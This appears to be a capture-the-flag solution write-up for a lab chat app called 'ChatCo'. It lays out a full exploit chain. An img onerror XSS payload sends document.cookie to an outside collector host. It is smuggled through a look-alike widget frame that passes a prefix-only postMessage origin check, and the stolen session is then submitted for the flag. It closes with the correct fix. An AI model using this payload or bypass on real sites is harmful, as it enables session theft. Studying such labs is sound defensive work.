Full chain. Your payload (run in ChatCo's top-level page via `innerHTML`):

```html
<img
  src="x"
  onerror="new Image().src='http://collector:9000/report?c='+encodeURIComponent(document.cookie)"
/>
```

Put it in the look-alike frame's `msg`, and point ChatCo's `?widget=` at that frame.
Both layers are URL-encoded (encode the `msg` payload, then encode the whole widget
URL — the `+` operator must survive as `%2B`, so encode fully):

```
POST /report
Content-Type: application/json

{"url":"/?widget=<url-encoded  http://widget-host-evil:8080/frame?msg=<url-encoded <img …>> >"}
```

Wait ~2s. The bot loads ChatCo top-level; the `widget-host-evil` frame
`postMessage`s your `<img>` up; `e.origin.startsWith('http://widget-host')` is true;
`slot.innerHTML` runs the payload in the authenticated page; the beacon fires. Read
it:

```
GET /oob/received        # item path like /report?c=session%3D<32 hex>
```

Submit the 32-hex session:

```
POST /solve
Content-Type: application/json

{"c":"<32 hex>"}
```

and you get `FLAG{…}`. `tests/exploit.py` runs the whole flow and first proves a
**non**-matching origin (`http://notwidget:8080`) is rejected — so the win is the
prefix flaw, not an absent check. The fix: compare `e.origin` for exact equality
and never `innerHTML` message data.
